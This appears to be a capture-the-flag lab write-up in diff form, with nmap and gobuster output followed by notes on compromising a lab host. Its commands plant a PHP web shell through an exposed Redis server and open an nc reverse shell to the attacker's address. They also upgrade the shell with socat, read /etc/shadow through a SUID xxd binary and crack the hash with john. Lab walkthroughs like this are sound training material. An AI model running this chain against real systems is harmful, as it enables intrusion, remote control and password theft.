@@ -1,0 +1,84 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 12:48 CEST
+Nmap scan report for 10.10.220.50
+Host is up (0.037s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=5/2%OT=80%CT=1%CU=39168%PV=Y%DS=2%DC=T%G=Y%TM=6450EA8E
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11
+OS:NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
+OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT      ADDRESS
+1   36.87 ms 10.9.0.1
+2   36.92 ms 10.10.220.50
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.01 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.220.50
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/05/02 12:49:36 Starting gobuster in directory enumeration mode
+===============================================================
+
+
+trying the following nmap script to gather some info: nmap --script=redis-info -sV -p 6379 10.10.159.239
+
+connecting to redis with the redis-cli: redis-cli -h 10.10.159.239
+
+can upload arbitrary php files to the running webserver via redis:	config set dir /var/www/html
+									config set dbfilename redis.php
+									set test "<?php system($_GET['cmd']); ?>"
+									save
+
+visited the following site to get a reverse shell(started listening before): 
+http://10.10.159.239/redis.php?cmd=nc%2010.9.58.163%204444%20-e%20/bin/sh
+
+spawned a pseudo shell as follows: python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+using socat to upgrade the shell to a fully interactive one:
+1) wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat (download the binary to my machine)
+2) hosted it using: python3 -m http.server 8080
+3) downloaded it unto victim machine with: wget 10.9.58.163:8080/socat
+4) gave it exec permissions: chmod +x socat
+5) started listening on attacker: socat file:`tty`,raw,echo=0 tcp-listen:6666
+6) connected from victim machine: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.58.163:6666
+
+uploaded linpeas to the target machine and started looking for privesc vectors
+
+there is a binary with SUID bit set: /usr/bin/xxd
+
+was able to read the root flag with the following command: /usr/bin/xxd "/root/root.txt" | xxd -r
+
+we can also use the same exploit to read the /etc/shadow file 
+
+put the /etc/shadow line into shadow.txt and the /etc/passwd line into passwd.txt 
+
+used this command to prepare for bruteforcing the password hash: unshadow passwd.txt shadow.txt > password.txt
+
+finally got the password with: john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
+
+
